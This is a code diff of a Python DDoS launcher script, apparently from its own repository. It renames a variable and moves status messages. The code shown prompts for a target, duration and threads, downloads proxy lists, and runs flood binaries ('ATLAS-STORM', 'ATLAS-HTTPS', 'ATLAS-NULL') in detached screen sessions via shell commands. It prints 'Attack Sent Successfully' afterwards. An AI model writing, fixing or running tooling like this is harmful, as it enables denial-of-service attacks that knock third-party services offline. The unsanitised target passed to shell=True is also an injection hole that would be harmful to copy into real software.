@@ -42,12 +42,12 @@ def getproxy() -> None:
 			with open("proxy.txt", mode="a") as file:
 				try:
 					file.write(requests.get(url, timeout=1000).text)
-					print("[+] Attack Sent Successfully!!")
-					print("Type 'STOP' to stop your Attack.")
 				except requests.ConnectError:
 					exit("[X] Connection Error")
 				except KeyboardInterrupt:
 					exit()
+		print("[+] Attack Sent Successfully!!")
+		print("Type 'STOP' to stop your Attack.")
 
 
 def OSclear():
@@ -177,37 +177,37 @@ def launchflood():
 		if methods in ["ATLAS-YOLANDA", "atlas-yolanda"]:
 			try:
 				target = input("[X] Target: ")
-				time = int(input("[X] Time: "))
+				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [3]: "))
 				getproxy()
-				run([f'screen -dm ./methods/ATLAS-METHODY {target} {time} {thread} proxy.txt proxy.txt'], shell=True)
+				run([f'screen -dm ./methods/ATLAS-METHODY {target} {floodtime} {thread} proxy.txt proxy.txt'], shell=True)
 			except:
 				print("Error try again")
 		elif methods in ["ATLAS-STORM", "atlas-storm"]:
 			try:
 				target = input("[X] Target: ")
-				time = int(input("[X] Time: "))
+				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
 				getproxy()
-				run([f'screen -dm ./methods/ATLAS-METHODS {target} {time} storm {thread}'], shell=True)
+				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} storm {thread}'], shell=True)
 			except:
 				print("Error try again")
 		elif methods in ["ATLAS-HTTPS", "atlas-https"]:
 			try:
 				target = input("[X] Target: ")
-				time = int(input("[X] Time: "))
+				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
 				getproxy()
-				run([f'screen -dm ./methods/ATLAS-METHODS {target} {time} proxy {thread}'], shell=True)
+				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
 			except:
 				print("Error try again")
 		elif  methods in ["ATLAS-NULL", "atlas-null"]:
 			try:
 				target = input("[X] Target: ")
-				time = int(input("[X] Time: "))
+				floodtime = int(input("[X] Time: "))
 				thread = int(input("[X] Threads [5-10]: "))
 				getproxy()
-				run([f'screen -dm ./methods/ATLAS-METHODS {target} {time} null-x {thread}'], shell=True)
+				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} null-x {thread}'], shell=True)
 			except:
 				print("Error try again")
 		elif methods in ["ATLAS-UAM", "atlas-uam"]:
